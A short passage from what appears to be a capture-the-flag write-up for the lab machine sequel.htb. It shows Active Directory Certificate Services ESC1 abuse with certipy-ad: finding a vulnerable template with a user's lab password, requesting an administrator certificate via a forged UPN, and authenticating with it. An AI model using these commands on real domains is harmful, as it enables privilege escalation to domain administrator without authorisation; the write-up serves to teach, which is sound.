
Once this template is configured, an attacker can use various tools to request an Administrator certificate and gain elevated access.


Check for vuln

```
certipy-ad find -u ryan.cooper -p NuclearMosquito3  -dc-ip 10.129.228.253 -target-ip 10.129.228.253 -vulnerable -enable -stdout
```

And found this is vulnerable to ESC1:

```
CA Name                             : sequel-DC-CA
DNS Name                            : dc.sequel.htb
Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
.
.
.
Template Name                       : UserAuthentication
Display Name                        : UserAuthentication
.
.
[!] Vulnerabilities
ESC1     : Enrollee supplies subject and template allows client authentication
```

Next req administrator cert

```
certipy-ad req -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -ca sequel-DC-CA -target 'dc.sequel.htb' -template 'UserAuthentication' -upn 'administrator@sequel.htb'
```

next login with certificate we got 

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
```